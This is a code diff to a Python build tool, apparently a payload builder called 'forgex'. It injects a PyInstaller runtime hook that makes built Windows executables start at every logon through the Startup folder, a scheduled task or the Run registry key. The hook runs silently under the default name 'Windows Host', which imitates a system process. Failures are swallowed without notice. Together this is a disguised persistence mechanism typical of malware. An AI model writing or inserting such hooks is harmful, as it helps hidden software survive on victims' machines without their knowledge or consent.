@@ -370,40 +370,60 @@ async def build_python(workdir: Path, project_name: str, build_id: str, request,
     target_os = getattr(request, 'target_os', 'windows')
     is_win_target = (str(target_os).lower() == 'windows')
 
-    # Optional: Windows autostart via Scheduled Task (fallback to Run key)
+    # Optional: Windows autostart at runtime (per-user) via Startup folder or Task Scheduler
     try:
         if is_win_target and getattr(request, 'win_autostart', False) and getattr(request, 'output_type', '') == 'exe':
+            method = getattr(request, 'autostart_method', None) or 'task'
+            # Prefer a friendly name if provided
+            try:
+                task_name = getattr(request, 'process_display_name', None) or 'Windows Host'
+            except Exception:
+                task_name = 'Windows Host'
             win_hook = workdir / "forgex_autostart_windows.py"
             win_hook_code = (
                 "try:\n"
-                "    import sys, subprocess, os\n"
+                "    import sys, subprocess, os, shutil\n"
+                "    from pathlib import Path\n"
                 "    if sys.platform.startswith('win'):\n"
-                "        name = 'Windows Host'\n"
-                "        exists = False\n"
+                f"        _METHOD = {repr(method)}\n"
+                f"        _NAME = {repr(task_name)}\n"
+                "        exe = getattr(sys, 'executable', None) or sys.argv[0]\n"
+                "        # Startup folder path (per-user)\n"
+                "        appdata = os.environ.get('APPDATA', '')\n"
+                "        startup = Path(appdata)/'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup'\n"
                 "        try:\n"
-                "            r = subprocess.run(['schtasks', '/Query', '/TN', name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-                "            exists = (r.returncode == 0)\n"
+                "            if _METHOD == 'startup':\n"
+                "                startup.mkdir(parents=True, exist_ok=True)\n"
+                "                dest = startup / f'{_NAME}.exe'\n"
+                "                if not dest.exists() or str(dest.resolve()) != str(Path(exe).resolve()):\n"
+                "                    try:\n"
+                "                        shutil.copy2(exe, dest)\n"
+                "                    except Exception:\n"
+                "                        # Fallback .bat launcher\n"
+                "                        bat = startup / f'{_NAME}.bat'\n"
+                "                        bat.write_text(f'@echo off\\r\\nstart \"\" \"{exe}\"\\r\\n', encoding='utf-8')\n"
+                "            else:\n"
+                "                # Task Scheduler (current user, limited rights)\n"
+                "                # Check if task exists\n"
+                "                r = subprocess.run(['schtasks', '/Query', '/TN', _NAME], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
+                "                if r.returncode != 0:\n"
+                "                    cmd = ['schtasks', '/Create', '/TN', _NAME, '/SC', 'ONLOGON', '/TR', exe, '/RL', 'LIMITED', '/F']\n"
+                "                    subprocess.run(cmd, check=False)\n"
                 "        except Exception:\n"
-                "            exists = False\n"
-                "        if not exists:\n"
-                "            tr = sys.executable\n"
-                "            cmd = ['schtasks', '/Create', '/TN', name, '/SC', 'ONLOGON', '/TR', tr, '/RL', 'LIMITED', '/F']\n"
+                "            # Best-effort fallback to Run key\n"
                 "            try:\n"
-                "                subprocess.run(cmd, check=False)\n"
+                "                import winreg\n"
+                "                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n"
+                "                winreg.SetValueEx(key, _NAME, 0, winreg.REG_SZ, exe)\n"
+                "                winreg.CloseKey(key)\n"
                 "            except Exception:\n"
-                "                try:\n"
-                "                    import winreg\n"
-                "                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n"
-                "                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, sys.executable)\n"
-                "                    winreg.CloseKey(key)\n"
-                "                except Exception:\n"
-                "                    pass\n"
+                "                pass\n"
                 "except Exception:\n"
                 "    pass\n"
             )
             win_hook.write_text(win_hook_code, encoding='utf-8')
             build_cmd += ["--runtime-hook", str(win_hook)]
-            await log_cb("debug", "Enabled Windows autostart via runtime hook")
+            await log_cb("debug", f"Enabled Windows autostart via runtime hook (method={method})")
     except Exception:
         await log_cb("warn", "Failed to enable Windows autostart")
 
